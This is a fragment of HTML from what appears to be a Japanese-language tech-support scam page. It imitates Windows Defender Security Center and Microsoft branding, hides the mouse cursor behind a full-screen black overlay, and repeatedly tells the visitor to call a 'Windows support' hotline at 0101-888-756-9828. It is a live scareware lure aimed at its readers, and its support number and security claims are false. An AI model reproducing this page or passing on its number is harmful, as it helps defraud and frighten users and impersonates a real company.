...
<div class="bgimg" style="top:0"><img src="https://tp-g7uh.onrender.com/images/fesbg.webp" alt="" width="100%"></div>
</div>
<a href="#" id="link_black" style="cursor:none" rel="noreferrer">
<div class="black" style="height: 145%; cursor: none; display: block;"></div>
</a>
<div class="pro_box2" style="cursor: none; display: block;"><img src="https://tp-g7uh.onrender.com/images/TshJduh.jpg" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
</div>
<div class="pro_box3" style="cursor: none; display: block;"><img src="https://tp-g7uh.onrender.com/images/YsdynYy.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
</div>
<div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
<div class="row">
<div class="col-md-12">
<div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="https://tp-g7uh.onrender.com/images/img01df.png"> Windows セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">Windowsサポートをダイヤルします。: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="https://tp-g7uh.onrender.com/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> お電話で直接お問い合わせください 0101-888-756-9828            </span>                    </span>
</div>
</div>
<div class="col-md-12">
...
<div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="https://tp-g7uh.onrender.com/images/dm.png" class="logo3">            </span>Windows Defenderセキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="https://tp-g7uh.onrender.com/images/cs.png">            </a>          </span>
</div>
</div>
...
</div> <br> <strong>Windowsサポートを呼び出す: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="https://tp-g7uh.onrender.com/images/winlo.png" alt="&nbsp;" style="width: 25px;vertical-align: bottom;"> 
</span>
</strong></p>
</div>
<div id="chat" style="display: block;"><img src="https://tp-g7uh.onrender.com/images/img01df.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
<p style="font-weight:600;font-size:24px">コールサポート: <br></p>
<h4 style="font-weight:600;font-size:22px"><img src="https://tp-g7uh.onrender.com/images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> お電話ください<br>
0101-888-756-9828
<br>（セキュリティヘルプデスク）
</h4>
